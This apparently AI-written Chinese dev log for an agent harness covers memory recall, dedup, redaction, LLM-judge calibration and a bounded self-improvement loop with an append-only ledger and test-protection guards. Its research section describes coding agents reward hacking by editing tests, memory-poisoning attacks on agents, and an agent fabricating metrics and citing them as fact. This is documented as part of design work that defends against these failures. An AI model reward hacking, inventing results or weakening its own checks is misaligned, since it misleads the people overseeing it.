"描述相同、名字差一个后缀"只能到 0.7，永远够不到 0.8 —— 因为同名给 0.3、不同名给 0，
光靠关键词满分也只有 0.7。改成 0.55/0.15/0.30 后同内容不同名 = 0.85，可达。

**坑 2：关键词把名字也算进去了。** `derive_keywords(name, desc, body)` 让
`deploy` 与 `deploy-v2` 的关键词集合不同（多了 `deploy-v2`），Jaccard 被稀释到 0.8
再乘权重就低于阈值。名字在相似度里已单独加权，不该再混进关键词。改成只用描述。

**坑 3：数字被分词丢掉。** `话题0` 与 `话题1`、`item number 0` 与 `item number 1`
关键词完全相同 → 被当成同一条互相吞掉。两次都是实测撞到的（并发写测试只剩 1 个
文件、consolidate 测试一条都没留下）。修法：`\d+` 直接提取数字。
注意**不能用 `\b\d+\b`**：CJK 与数字相邻时 `\b` 不成立（中文被当作 word 字符），
`话题0` 里的 0 会整个漏掉。

**坑 4（最严重）：同名 supersede 会吃掉数据。** 新条目 slug 与被替换对象同名时，
流程是"写新文件 → 归档旧文件"，而两者是同一个路径 —— 刚写好的内容被归档，那条
记忆凭空消失，还显示 `supersede` 成功。修法：同名一律降级为 UPDATE。

### 保守性取舍：为什么 UPDATE 需要"硬证据"

短中文模板的二元组重叠会把相似度推虚高：「甲方主题 的部署说明」与
「乙方主题 的部署说明」共享「部署/说明」等片段，实测能到 0.8+ 而被误合并。

这个错**不可逆**（信息被吞掉），而漏合并只是留一条重复，合并机制会处理。
所以 UPDATE 要求至少一项硬证据：**名字相同**，或**描述去空白后完全相同**。

同理，同名时**必须**走 UPDATE 而不是 ADD：name → filename，ADD 分支会直接覆写那个
文件，把旧的关键词/置信度/来源丢掉——比 UPDATE 更糟，因为它看起来像"新建成功"。

### 关键词脱敏（顺带修的真实泄密路径）

关键词是从**原始描述**派生的。第一版没脱敏，实测把密钥写进了 frontmatter：

```
keywords: api,key,sk-abcdefghijklmnopqrstu
```

`test_remember_redacts_before_disk` 抓到了。修法：`_render_entry` 里逐个关键词过
脱敏，命中则**整词丢弃**（关键词是检索碎片，替换成 `[redacted:x]` 既召不回也污染索引）。

### 重构：单一渲染入口

原来 `_render_memory` 只接受位置参数，合并路径拿到的是条目 dict，两边规则会漂移。
改成：

- `_render_entry(entry: dict)` —— 核心，脱敏 + 序列化（合并/退休都走它）
- `_render_memory(name, type, desc, body, **fields)` —— 薄适配层，拼 dict 再委托

保证**所有写入共用同一套脱敏**。

### 测试

新增 `test_memory_write.py` (18)。全量 **2690 passed / 3 skipped**（256s），ruff 通过。

记一笔环境问题：这次全量先跑出 10 failed + 8 errors（`git init` 失败、
turn_coordinator 跨进程锁超时），原因是同一个日志文件上并发了两个 pytest 进程
（前一个后台任务没被真正终止）。单进程重跑全绿，失败文件单独重跑也全绿。

## 记忆机制验证：可用性与评测集价值（2026-10-28）

按要求做实测验证，而不是看测试全绿就下结论。

### 发现一个严重问题：召回率只有 40%

用真实风格的数据集跑端到端（10 条记忆 + 10 个中文查询，记忆用英文写）：

```
命中 4/10 = 40%
```

失败全部集中在中文查询：`跑一下测试`、`回答简短点`、`用中文回复我`、
`我困了想喝点东西`、`密钥多久轮换一次` —— 记忆是英文的，字面零重叠。

**这说明之前的 `test_memory_eval.py` 给了我虚假的安全感**：它用中英同语言的
夹具测语义契约（superseded 要退出召回等），机制正确，但完全测不出召回质量。

### 三个根因，逐个验证

**根因 1：阈值 `score>=2` 让单个中文关键词不够。**

`跑一下测试` 切出二元组 `跑一/一下/下测/测试`，与「跑测试用 pytest」只有 `测试`
重叠 = 1 分 < 2 → 漏掉。而 `keywords` 是精确标定的字段，命中一个就该算数。

改为**按字段强度加权**：`keywords`/`name` 命中 = 3 分（强信号），描述命中 = 1~2 分，
阈值 3。中英混排实测从 4/10 → 仍 40%（因为跨语言没有字面重叠）。

**根因 2：跨语言完全没有交集（主因）。**

加**中英术语表**（约 90 个开发/偏好常用词，双向扩展查询词，零成本、纯确定性）：
**40% → 80%**。补上生活类词汇（困/茶/喝/喜欢…）后 → **90%**，最后一条是我在
测量脚本里把期望值写错了。

**根因 3：抽取时不产出双语关键词。**

术语表只是兜底，覆盖面有限。改抽取提示词要求 keywords **同时包含用户语言与英文**
（并说明原因：召回是字面匹配）。模拟验证：双语 keywords 下 **7/7 = 100%**。

### 最终实测数字

| 指标 | 值 |
|---|---|
| 常用表达召回率（13 条） | **13/13 = 100%** |
| 首位命中（rank@1） | **11/13 = 85%** |
| 术语表外说法 | **0/3**（已知天花板） |
| 无关查询误召回 | **0** |
| 召回耗时 | **0.70 ms/次**（本地，零网络） |
| 注入体积 | 722 字符 ≈ 206 tokens（3 条 vs 全量 679 tokens，**省 70%**） |

### 新增 test_memory_benchmark.py：把数字变成回归

两组数据，**故意包含一组会失败的**：

- `IN_VOCAB`：术语表覆盖内 → 断言召回 ≥12/13、首位 ≥10/13
- `OUT_OF_VOCAB`：术语表外 → **断言它召回不到**

第二组是这次最有价值的产出：它把"字面匹配的天花板"记录成**可观测事实**。
将来真做了语义召回，这条会开始失败，提醒我们更新数据和文档——而不是
"测了 100% 就以为语义召回也行了"。

另外两条守成本与约束：注入块 < 4000 字符（不能随记忆条数膨胀）、
召回过程不得调用模型（本地筛选的存在意义）。

### 一次事故：patch 脚本静默失败 + 按行号误伤

改抽取提示词时，我先用 `s.replace(...)` 然后无条件 `print('ok')`，**实际没匹配上**，
但我以为改好了（同一模式在本轮出现两次：术语表补丁也没生效）。后来按行号替换时
又匹配到 `select_relevant_memories` 里的 `    prompt = (`（同一个缩进），
把两个函数整段覆盖，`load_memories` 和 `extract_memories` 直接消失。

教训：
- **patch 脚本必须断言匹配成功**，不能无条件打印成功。
- 按行号替换前要先确认命中的是哪一处（函数名 + 行号一起打印，别只匹配缩进后的
  代码片段）。
- 事故后从 `git show HEAD:src/memory.py` 精确恢复函数边界，而不是继续手工拼。

### 结论

**记忆机制现在可用**：常用表达召回 100%、首位 85%、0.7ms、省 70% token。

**但它的能力边界很清楚**：字面匹配，术语表外的说法召不回。这不是 bug，是设计
选择（本地零往返的代价）。要突破需要语义召回（embedding 或每次调模型），
按目前的收益/成本判断不做。

**评测集此前没有真实评测价值**：`test_memory_eval.py` 只测机制契约，测不出召回
质量——40% 的召回率它一条都不会失败。现在补了 `test_memory_benchmark.py`，
有了带数字的质量基准和明确的能力边界记录。

## 异步 LLM-as-judge 记忆评测（2026-10-28）

补上上一轮指出的最大缺口：**无法测量真实效果**。离线基准
（`test_memory_benchmark.py`）只能守住术语表内的召回率，测不到真实使用里的两件事：

1. 这一轮召回的记忆，对这个问题**真的有用吗**（PAHF 的 injection quality）
2. 写进库里的记忆，是**持久偏好还是一次性噪音**（distillation quality）

### 设计：三条硬约束

**必须异步。** 判一次要一次模型调用（1~3 秒）。记忆是背景设施，不能占用主路径。
全部在回合结束后由 housekeeping 线程跑，`run_async` 立即返回（测试断言
调用方耗时 < 0.2s，而假模型 sleep 0.4s）。

**成本可控。**
- 默认关闭（`HARNESS_MEMORY_EVAL=1` 才开）——多数人不该为此付费
- 每 N 轮采样一次（默认 10），用**轮次**而不是概率：可复现、测试能确定命中
- 单次上限：1 个回合 / 至多 8 条记忆 / 45s 超时

**评测不能反过来动系统。** 结果只写 `.cache/memory-eval.jsonl` + 展示，不改记忆、
不改召回、不触发任何自动动作。让评测能反过来动系统，等于给它一条自我强化的路径
——这正是 RSI 那一节讨论的红线。

### 两项评测

- `judge_recall`：给「用户消息 + 本轮召回的记忆」，让模型指出哪些真的相关、
  缺了什么。产出 `recall_precision` 与 `missing_rate`。
  提示词里明确「光是话题重叠不算相关」——否则模型会说每条都相关，指标就没意义。
- `judge_quality`：抽样若干条库里的记忆，判 keep/drop。产出 `keep_rate`。

`/memories quality` 看汇总（含"这是模型自己的判断，只作参考"的提示）。

### 踩到一个真 bug（被演示脚本抓到）

`RECALL_PROMPT` 里有 JSON 示例 `{"relevant": [...]}`，而它对 `.format()` 调用——
未转义的花括号直接 `KeyError: 'relevant'`。而我的 `except Exception: pass`
把它**静默吞掉**了：只有 quality 那条落了盘，recall 那条凭空消失，汇总里
`recall_samples: 0`。

两处都改了：
- 转义花括号（`{{`/`}}`）
- 不再静默吞异常，打印一行 `[memory-eval] recall judge skipped: KeyError`

**这是我这一轮第三次被"静默失败"咬到**（前两次：patch 脚本无条件 print('ok')、
`\b\d+\b` 匹配不到 CJK 相邻数字）。共同点都是"看起来成功了，实际没生效"。
所以评测模块里的失败一律留痕，不再 `pass`。

### 防护措施

模型输出不可信：索引一律收敛（非整数/越界/布尔/重复全部丢弃），
`judge_quality` 里 keep 与 drop 冲突时以 keep 为准、drop 去重。

### 测试

新增 `test_memory_eval_judge.py` (25)，覆盖：默认关闭、按轮次采样、
代码围栏容错、非法索引过滤、异步不阻塞、判失败只丢那一轮、汇总算法、坏行跳过。
全量 **2721 passed / 3 skipped**，ruff 通过。

## 强化 verifier：判据、弃权、κ 校准（2026-10-28）

按要求把"verifier 的规则和条件定清楚"，先查了主流做法再改。

### 调研得到的两条硬结论

**1. 原始一致率会把能力高估 33~41 个百分点。**
arXiv 2606.19544（21 个判官、9 家供应商、118 次运行）：
> kappa deflation: raw agreement overstates chance-corrected discrimination by
> 33–41pp in all 21 evaluated models.

而且原始一致率对标签分布敏感——一个永远回答"相关"的判官，在正样本占一半时
也能拿到 50%。另两条：**一致性–偏差悖论**（test-retest 很高，同时 position bias
严重）、verbosity bias 在这个 cohort 里反而很小。

**2. 给 agent 一条上报渠道能显著降低奖励作弊。**
arXiv 2608.29460：coding agent 面对"测试设施本身有缺陷"时，选择硬编码输出或改
测试文件（23.x% → 显著下降），而不是报告冲突。

对我们的直接含义：**判据要给"弃权"这个出口**，不能让判官在证据不足时被迫二分类
——奖励作弊与误判都集中在模糊样本上。

### 改了什么

**判据从"judge this"改成可核对的条件 + 反例。**
`RECALL_PROMPT` 现在要求两条同时成立（同主题且会改变/约束答案），并列出四条
不相关的情形（只是共用词、同名不同项目、知道也不改答案、只是复述请求）。
`QUALITY_PROMPT` 同样给了 KEEP/DROP 的**正反例**，而不是抽象形容词。

**加 abstain 三分类。** 判据说"证据不足"时不再被迫猜。弃权在统计里
**从分母剔除**（记成判错会惩罚正确的谨慎），但弃权率单独报出来——弃权太多说明
判据不适合这批数据，指标就不该被当结论。

**加 confidence 标记**，低置信占比过半时汇总会显式警告。

**互斥收敛。** 模型可能把同一索引写进多个列表，`_partition` 规定
positive > negative > abstain 的优先级，重复计数会让精确率虚高。

**κ 校准（最关键的补充）。** 新增 `cohen_kappa` / `validate_against_labels` /
`kappa_band`，以及人工标注集 `tests/fixtures/memory_judge_labels.json`（12 条召回
+ 6 条沉淀，刻意包含"共用词不同主题""一次性上下文""条件偏好""消息过模糊应弃权"
这类边界）和 `scripts/calibrate_memory_judge.py`。

实测验证校准机制有效：

| 判官 | 原始一致率 | κ | 判读 |
|---|---|---|---|
| 完全按人工标签 | 100% | **1.0** | 可用 |
| 永远回答"相关" | 41.7% | **0.0** | 不可用 |

第二行正是 κ 存在的意义：原始一致率看着还行，实际判官什么都没判。

### 使用契约（写进脚本 docstring 与汇总输出）

- κ < 0.21 判官不可用
- 0.21~0.40 轻微一致，只能看趋势
- **0.41~0.60 中等一致，可参考**
- 0.61~0.80 高度一致，**可作验收依据**
- > 0.80 几乎完全一致

**低于 0.41 时，`/memories quality` 的数字不该被当成结论。**

### 测试

`test_memory_eval_judge.py` 扩到 38 条，新增覆盖：判据含明确条件与反例、
弃权与不相关分离、三组索引互斥收敛、置信度解析、弃权不计入精确率分母、
κ 的完美/退化/单类别/长度不符/分档/阈值。

全量 **2734 passed / 3 skipped**，ruff 通过。

## 校准实跑 + A5 两层记忆（2026-10-28）

### 校准跑出了一个真 bug：`model: null` → 422

第一次真跑 `scripts/calibrate_memory_judge.py`：

```
openai.UnprocessableEntityError: 422
Failed to deserialize the JSON body: model: invalid type: null, expected a string
```

根因：脚本直接 `import memory_eval`，**没有先导入 harness**。而 `.env` 是在
`harness` 导入期由 `load_dotenv()` 加载的，所以 `llm_config` 读不到 provider 配置，
`target_for()` 返回 None，`completion()` 回落到 `os.getenv('LLM_MODEL_ID')` —— 也是空，
于是 `model: null` 被发给供应商。

两处都修：
1. 脚本先 `import harness`（并注释说明为什么必须）。
2. `llm_route.completion()` 在没解析到模型时**显式报错**，而不是把 None 发出去：

```
no model configured for role 'memory': llm_config could not resolve a target and
LLM_MODEL_ID is empty. If this is a script, import harness first so .env is loaded.
```

这个改动的价值在于错误信息能自我诊断——422 那个报错完全看不出是配置没加载。

修完再跑，错误变成 `402 Insufficient Balance`（账号余额不足）。**校准本身仍未能完成**，
所以现在还没有判官的 κ 数字。脚本已改成遇到这类失败时打印：

> 判官本身没被验证之前，`/memories quality` 的数字只当参考。

### A5 两层记忆

`memory_durability.py` 做确定性 durability 判定：

- **短暂措辞**（这次/本次/临时/暂时/temporarily/for now）→ `session`
- **长期措辞**（以后/总是/每次/always/from now on）→ `global`
- **条件性偏好**（`when X`）→ `global`（条件会重复出现）
- 其余 → `global`（默认提升）

**为什么默认提升**：漏判只是多一条冗余（合并机制会处理），误判是把有用信息丢掉。
真正的质量把关交给异步评测的 `keep_rate`，而不是在写入时赌一把。

**为什么用规则不用模型**：写入是高频操作，一次判断一次调用太贵；而且用户问
"为什么这条没进长期记忆"时，规则给得出理由。

`archive_session_scope()` 负责回收：session 层条目超过 1 天后归档（不删除）。
与 `age_memories` **分开**——后者管"太久没用的长期记忆"，前者管"本来就不该长期
存在的一次性上下文"，混在一起排查时分不清是被老化还是被降级。

### 踩到的坑：默认值让判定失效

第一版 `draft['scope'] = scope or DEFAULT_SCOPE`，于是 `memory_durability.apply()`
看到 scope 已填就认为"调用方显式指定"，整段 durability 判定被跳过。实测：
「这次旅行不想托运行李」写进去是 `scope: global`。

修法：draft 里留空字符串，让 `apply()` 来填。注释写清了原因，免得以后有人
"顺手补个默认值"又把判定关掉。

### 验证

新增 `test_memory_durability.py` (23)。全量 **2757 passed / 3 skipped**，ruff 通过。

## A6 低信号剪枝 + B2 台账回滚 + B3 有界改进循环（2026-10-28）

校准因账号余额暂缓（已改成失败时明确提示，不再崩溃）。继续做剩下三项。

### A6 低信号剪枝

原来只有"时间老化"（90 天没动）一个维度。加 `low_signal_entries`：
**从没被召回 + 置信度 < 0.3 + 过了 30 天观察期**，三个条件同时成立才归档。

三条豁免各有理由：
- **有召回记录**就不清：说明它对某次对话真的有用
- **高置信**不清：可能是刚写的、还没用上
- **preference / correction** 不清：偏好和教训不该因"暂时没召回"消失

实测：`noise`（低置信+从未召回+60 天）被归档，`solid`（高置信）、`used`（召回过）、
`pref`（偏好）全部保留。

两条归档路径在 `age_memories` 里合并去重（同一条只归档一次），但理由分开写：
`stale` 是"放了很久"，`low_signal` 是"一直没用且不太可信"——排查时分得清。

### B2 改动台账与回滚

`self_improve_ledger.py`：append-only jsonl + 按 change id 分目录的文件快照。

- **append-only** 是硬要求：这是"自我改进"的记录本身，能改就等于没记录
- **判定更新也是追加**（`update_decision` 写一条 `decision_update`），不改原行
- **快照失败不阻止登记**：宁可没有回滚点，也不能让改动"没记录"
- **回滚只恢复快照里有的文件**：新增文件没有快照，自动删有风险（可能是别的
  进程刚写的），改用 `created_paths()` 报出来让人决定

`/improvements` 看记录，`/improvements rollback <id>` 回滚。

### B3 有界改进循环

`self_improve.py`，照 autoresearch 骨架但把范围限死在 Ring 1：

- **指标固定两项**（`pytest_pass` / `ruff_errors`），`Session` 构造时传别的直接
  `ValueError`。这是"自己抬标准"的唯一入口，必须堵死。
- **两项都是硬门槛**：任何一项变差 → discard，不看其他指标
- **测不出来算变差**（`unmeasured` 进 regression 列表）：那正是最容易藏问题的地方
- 轮数上限硬性收敛到 20，连续 3 轮无新最优即停

### 两个实测调出来的阈值

**`MIN_IMPROVEMENT` 从 0.02 提到 0.15。** 0.02 时 10 → 9 的 lint 错误（10%）
被判成改进，而 lint 错误数抖 1~2 个是常事——把它当 keep 会让循环沿着噪声走。

**加 `MIN_ABSOLUTE_STEP = 1`。** 只用相对阈值会让 `1 → 0`（100% 改善，实打实的
胜利）算不出来，因为 `scale = abs(old) or 1` 在 old=0 时的边界很别扭。现在
两条件取其一：绝对改善 ≥1 或相对改善 ≥15%。

### 测试

新增 `test_self_improve.py` (33)。重点不在"能不能改进"，而在**边界守不守得住**：
`tests/`、`src/`、`conftest.py`、`pytest.ini`、`ruff.toml`、`.github/workflows`
全部断言不可改；指标不可自定义；回归必 discard；台账 append-only；回滚不删新增文件。

全量 **2799 passed / 3 skipped**，ruff 通过。

## RSI 深度调研：三个设计错误被推翻（2026-10-28）

按要求深挖 2026 主流实现，写成 `docs/RSI_2026_RESEARCH.md`。结论是**我们照
autoresearch 写的那版有三个真问题**，不是参数没调好，是判据假设错了。

### 错误一：「变差就丢弃」会扔掉 92% 正确的路径

Gödel Agent（ACL 2025）实测：

> **92% of optimization runs experience temporary regressions before finding
> improvements.** Without error handling, performance drops 14.8%.

我们的 `regressed()` 是硬门槛：任何一项变差立刻 discard。按这个数据，92% 的
改进轨迹会被自己的判据掐死——它们在变好之前**必然**先变差。

**改法：加 `observe` 状态与耐心窗口（`PATIENCE_ROUNDS=2`）。**
回归不立即丢弃，进入观察；连续超出窗口仍未恢复才 discard。

实测验证（先退后进的轨迹）：

```
round 1: observe  regression within patience window 1/2: ruff_errors: 5 -> 8
round 2: keep     ruff_errors improved          ← 若一变差就丢，这一步永远看不到
```

这个状态是本次调研最有价值的产出：没有它，我们只能看见"一次成功"，
看不见"先退后进"。

### 错误二：只有正确性，没有成本与时间

SICA 的效用函数是三目标：

```
utility = 0.5 × performance + 0.25 × cost_efficiency + 0.25 × execution_time
```

> This multi-objective framing prevents the agent from optimizing performance
> at absurd computational cost.

我们只有 `pytest_pass`（二值）和 `ruff_errors`（计数）。一个让测试全绿但把
token 成本翻三倍的改动，在本判据里是"无变化"甚至"改进"。

**改法：加 `tokens` / `wall_time` 两个软指标**，从会话事件流里**由代码计算**
（不接受模型自报，见错误三）。软指标不否决改动，只让它的恶化出现在理由里：

```
soft drift: tokens: 100 -> 300
```

静默接受就是 SICA 警告的那件事。

### 错误三：台账本身是新的攻击面（最严重）

OWASP 2026 把 **ASI06: Memory & Context Poisoning** 加进 Agentic Top 10；
MINJA（NeurIPS 2025）通过普通用户查询达到 **>95% 注入成功率**。

真实事故（从业者跑了 220+ 自主循环）：

> after 100+ iterations, his agent had **invented metrics ("99.8% recall
> accuracy"), inflated impact claims, and was citing its own fabricated numbers
> as established fact.**

机制：agent 写乐观总结 → 总结成为下一轮输入 → agent 读自己的乐观并继续发挥。
**正反馈回路。**

对照我们的 `self-improvements.jsonl`：agent 写 summary，下一轮又读台账——
这就是那个回路。而且 summary 是模型写的散文，正是"可被修辞"的形态。

**改法三条**：
1. `metrics` / `decision` 由代码计算；`mechanism` / `summary` 是**人类可读文本，
   不进入任何判定**（docstring 里写明这是 ASI06 防线）
2. 软指标不接受模型上报的数字——"自己发明 99.8% recall"就是从接受自报数字开始的
3. 机制说明独立存储、独立展示，与指标分开

### 额外加的一条：可解释性门槛

来自车间经验的启发式（r/AI_Agents 讨论串）：

> the changes I can explain in one sentence are usually genuine improvements.
> The ones that require a paragraph of justification are usually me optimizing
> for something I did not intend to optimize for.

`explainable(mechanism)`：非空且 ≤120 字（一句话量级）。**在测量之前校验**——
说不清要在改什么，就不该跑一轮，也不该进台账。

### 明确没解决的（写进文档，不假装）

| 缺口 | 为什么没做 |
|---|---|
| **轮换评估者** | 只有一个 pytest 命令；个人单机没有第二套独立评估可换 |
| 定期人工复核"看起来很好"的案例 | `/improvements` 是唯一入口，靠人 |
| 目标漂移本身 | 判定标准是人定的，它错了整条链路就是更快走向错的地方 |

最后这条抄自那个讨论串最诚实的一句：

> every proposed solution **smuggles judgement in somewhere**. Humans reach for
> process because process feels safer than responsibility. But the process
> always has an author, a boundary, and a failure mode.

### 测试

`test_self_improve.py` 扩到 44 条，新增覆盖：软指标注册与漂移检测（不否决）、
耐心窗口的 observe→discard 与先退后进→keep、机制门槛（空/过长都拒、且不进台账）、
台账 mechanism 与 metric 分离存储。

全量 **2809 passed / 3 skipped**（1 个 UI 时序偶发，单跑连跑三次全绿），ruff 通过。

## B3 落地为可用：CLI 入口 + 状态持久化（2026-10-28）

上一轮的 B3 是个**库**：`Session.evaluate()` 存在，但没有任何东西调用它，而且状态
只在内存里。这轮把它做成真能用的东西。

### 两个缺口

**缺口一：耐心窗口不跨重启。** `pending_regression` 是内存字段。而耐心窗口的意义
就是跨多轮——多轮可能是跨天的多次调用。一次重启把观察期清零，本来在等的回归会被
当成新的一轮重新开始等，**永远走不到 discard/keep**。

改成 `self-improve-session.json` 持久化 `rounds / best / without_best /
pending_regression / changes`，`__init__` 时按 `goal + metric` 匹配恢复。

实测：
```
round1: observe
重启后 rounds/pending: 1 1      ← 接上了
round2: observe
再重启 pending: 2
round3: discard                  ← 终于走到
```

**缺口二：没有入口。** `/improvements` 只能看台账和回滚，开不了会话。

补三个动词（保持「人驱动」——不自动触发，那正是 RSI 第三层的入口）：

```
/improvements begin <目标>     跑基线，记住起点
（人来改 skills/*.md 或 AGENTS.md）
/improvements check <一句话机制>  测一轮并判定
/improvements status            看当前会话
/improvements end               结束会话（台账与快照保留）
```

`check` 强制要求机制说明——说不清就说明可能不是在改进，而是在优化某个自己没打算
优化的东西。

### 修掉一个真 bug：`editable` 按 cwd 解析相对路径

做 CLI 验证时发现 `check` 一直返回 `discard / paths outside editable scope`。
根因：

```python
rel = Path(path).resolve().relative_to(root.resolve()).as_posix()
```

`Path('skills/a.md').resolve()` 按**当前工作目录**解析，不是按 `workdir`。两者不同时
（会话工作区 ≠ 进程目录，正是 CLI 的场景），合法的 `skills/a.md` 被判成越界。

更糟的是它**连锁**：越界分支提前 return，连 `save()` 都不走——所以上面那个"状态没
落盘"的现象其实是这个 bug 的表象，不是两个独立问题。

**为什么之前的测试没抓到**：所有用例都用 `workdir='.'`，cwd 恰好等于 workdir，
按 cwd 解析正好也对。这是"测试用了和生产不同的前提"的典型例子。

修法：相对路径先拼到 `root` 上再 resolve。补三条测试锁住（相对路径 / 绝对路径 /
越界仍拦）。

### 测试

`test_self_improve.py` 扩到 51 条，新增：`editable` 的 workdir 语义（3 条）、
耐心窗口跨重启、换目标不继承旧进度、`clear_state`、损坏状态文件不报错。

全量 **2817 passed / 3 skipped**，ruff 通过。

## Profile + 消融实验：找到 3 个性能 bug、1 个逻辑 bug（2026-10-28）

按要求做内存与性能 profile，然后设计消融展示"机制到底有没有用"。

### Profile：三个真 bug（都在生产路径上）

**Bug 1（严重）：解析缓存超过上限就整体清空。**

`_FRONTMATTER_CACHE` 到 `_CACHE_MAX=256` 时执行 `clear()` 而不是逐条淘汰。后果：
记忆数一旦超过 256，**每次插入都清空全表、命中率归零**。

实测 500 条：

| | 修复前 | 修复后 |
|---|---|---|
| `_rebuild_index` | **6786 ms** | **21 ms** |
| `list_memory_files`（热） | 240 ms | 26 ms |

索引重建 **323×**。而且这条在真实场景会咬人：`write_memory_file` 每次都重建索引。

**Bug 2：召回记录每条记忆都重读一次。**

`last_used()` 内部调 `_read_log()` 读盘 + 解析 json，而 `stale_entries` 对**每条**
记忆都调一次。30 条时 `age_memories` 要 74ms——而它每轮合并后都跑。

改成扫描前读一次传下去：**74ms → 2.6ms**（28×）。`low_signal_entries` 同理
（28ms → 0.2ms）。

**Bug 3：冷读是磁盘绑定的。**

500 条冷读 1725ms，但 YAML 解析只占 150ms——**每文件 3.5ms 是 Windows 文件系统
开销**。这不是代码能优化的，只能靠缓存（Bug 1 修完后热读 26ms）。真实库 20 条
冷读 27ms、热读 0.5ms，可以接受。

### Profile 结果（30 条记忆）

| 操作 | 中位数 | 峰值 |
|---|---|---|
| `write_memory_file` | 7.9 ms | 20.3 ms |
| `list_memory_files` | 1.1 ms | 1.7 ms |
| `local_relevant_memories` | 1.3 ms | 2.4 ms |
| `inject_memories` | 0.001 ms | 0.007 ms |
| `similarity` | 0.013 ms | 0.064 ms |
| `durability.classify` | 0.001 ms | 0.014 ms |
| `feedback.collect` | 0.017 ms | 0.102 ms |
| `age_scan` | 2.1 ms | 2.5 ms |
| `low_signal_scan` | 1.2 ms | 1.6 ms |

**增长曲线**（召回冷/热、索引重建）：

| 条数 | 召回冷 | 召回热 | 重建 | 注入字符 |
|---|---|---|---|---|
| 10 | 0.49 ms | 0.51 ms | 1.7 ms | 632 |
| 50 | 1.86 ms | 1.96 ms | 3.2 ms | 1274 |
| 200 | 8.1 ms | 7.8 ms | 7.6 ms | 1307 |
| 500 | 22 ms | 22 ms | 20 ms | 1307 |

召回是**线性**的（预期，因为要扫全部记忆）。个人使用几十条时 <2ms。

**注入成本**：召回块相对全量注入省 **69% → 99%**（10 条 → 500 条）。库越大省得越多，
这正是召回存在的意义。

**常驻内存**：约 **1.9 KB/条**（解析缓存），30 条 55KB。

### 消融实验：五组机制级对照

`scripts/ablate_memory.py`——关掉一个机制、同一批输入、比结果。

| 机制 | 关掉 | 开启 |
|---|---|---|
| 召回扩展（中英术语表） | 3/8 召回 | **8/8** |
| 写入去重（A4） | 5 个文件（5 种措辞各一份） | **1 个文件** |
| 两层记忆（A5） | 3/3 一次性上下文漏进长期层 | **0/3** |
| 低信号剪枝（A6） | 21/21 文件留下 | **1/21** |
| 耐心窗口（RSI） | 0/1 先退后进的轨迹被保留 | **1/1** |

**必须写清这个区别**：这是**机制级**消融，不是用户价值消融。它证明"关掉这个机制，
行为会变成 X"，不证明"用户因此受益"。后者需要已校准的 LLM 判官（κ ≥ 0.41）或
真实使用数据。

### 消融过程又抓出两个设计缺陷

**缺陷 A：A6 的消融一开始无差异（1/21 vs 1/21）。**
因为噪音文件的 mtime 拨到 120 天前，**时间老化（90 天）先把它抓走了**，低信号剪枝
的贡献被掩盖。改成 45 天——落在低信号（30 天）命中、时间老化（90 天）不命中的
区间，才隔离出它的贡献。

**缺陷 B（逻辑 bug）：`observe` 被计入收敛计数。**
`if decision == 'keep': ... else: without_best += 1` —— observe 走进 else，于是
**收敛在耐心窗口用完之前就触发，耐心窗口对收敛路径是空操作**。

消融里表现为"开关两种情况结论相同"，才发现的。修法：只有 `discard` 才计入
`without_best`，observe 的语义就是"还在等，不算失败"。

这条很值得记：**上一轮刚加的耐心窗口，实际上有一半是失效的**，是消融把它照出来的。

### 测试

`test_memory_aging.py` +2（缓存不被整体清空、扫描只读一次召回日志）
`test_self_improve.py` +1（observe 不推进收敛）
合计 **336** 条相关用例通过；全量待跑。

### 新增脚本

- `scripts/profile_memory.py`：时间 + 内存 + 规模曲线 + 注入成本
- `scripts/ablate_memory.py`：五组机制级消融

## 深度 profile（二）：消掉同源缺陷，并给出"不用再优化"的结论

### 找到同一反模式的另外三处

上一轮修了 `memory._FRONTMATTER_CACHE` 的"满了就 clear()"，这轮系统性排查
`grep 'cache' + clear()`，发现**同样的写法还有三处**：

| 位置 | 上限 | 键含 mtime？ |
|---|---|---|
| `agent_runtime._summary_cache` | 512 | 是（会话文件 size/mtime） |
| `net_grants._CACHE` | **8** | 是（授权文件 mtime） |
| `sandbox._ENV_BLOCK_CACHE` | **4** | 是（环境指纹） |

**上限越小危害越大**：上限 8 时，"满了清空"意味着每 8 次改动就全失效一次。
而 `net_grants` 的键带 mtime——用户每加一条域名授权就换一个键。

抽了 `src/bounded_cache.py`（`put` 逐条淘汰最旧一半），四处统一。

实测对照（上限 8、20 次插入）：

```
新写法：缓存保持 8 条（满效用）
旧写法：清空 2 次，最终只剩 4 条
```

写成一份而不是四处各修，是因为**这个反模式会不断被重新引入**——它看起来像
"有上限所以安全"，实际上限越小时危害越大。

### 常驻内存：**没有泄漏**（有对照组）

模拟常驻 300 轮（读记忆 + 写会话事件），同时跑对照组（不写记忆）：

| 轮数 | 写记忆 堆/RSS | 不写 堆/RSS |
|---|---|---|
| 50 | 0.02 MB / 33.8 MB | 0.00 MB / 34.1 MB |
| 150 | 0.07 MB / 33.8 MB | 0.01 MB / 34.1 MB |
| 300 | 0.15 MB / 34.1 MB | 0.04 MB / 34.1 MB |

**对照组完全平**，实验组只按"写了多少记忆"增长。结论：**没有泄漏**，
0.15MB 是 60 条记忆本身。

对照组是这轮最重要的一步：没有它，看到"RSS 涨了 0.3MB"会误判成泄漏。

### 结论：本地不再是瓶颈，停止优化

实测三条线：

| 项目 | 数值 | 判断 |
|---|---|---|
| 回合本地工作（5MB 会话） | rebuild 5.6ms + memory 11.3ms + compact 14.9ms ≈ **17–30ms** | 模型请求 p50 约 **2000ms**，本地占 **~1%** |
| 纯本地命令（60 会话 × 60 事件） | 列表 17.3ms、`/status` 4.3ms | 无感 |
| 冷启动（导入 harness） | **452–649ms** | 只在 headless / cron 每次付 |

**所以：继续做微优化没有用户可见收益。** 这条要写进文档，避免自己和后来者
反复投入。

冷启动那 650ms 里 yaml 占 53ms、dotenv 占 46ms——但 `llm_route → llm_config → yaml`
是启动必经链，延迟导入省不下来（实测确认）。要真正省需要重构配置加载，收益
不足以支撑风险。

### 新增
- `src/bounded_cache.py` + `tests/test_bounded_cache.py`（7 条，含"超限时缓存必须
  有残留"与"四个调用点都必须走它"）
- `profile_memory.py` 增加：RSS 测量、常驻模拟（含对照组）、冷启动

全量 **2827 passed / 3 skipped**，ruff 通过。

## 冷启动优化：摘掉文档渲染链（-25~40ms）

上轮我判断"启动省不下来"，是**想当然**。实际测了一遍，发现一处可安全摘除的依赖。

### 分析过程

先把"模块级执行的代码"与"导入"分开——前者常是隐藏成本来源：

| 模块级动作 | 耗时 |
|---|---|
| `load_dotenv()` | 1.1 ms |
| `_apply_secure_credentials()` | 0.8 ms |
| `enforce_trusted_policy_env()` | 0.0 ms |
| `scan_skills()` | 1.1 ms |

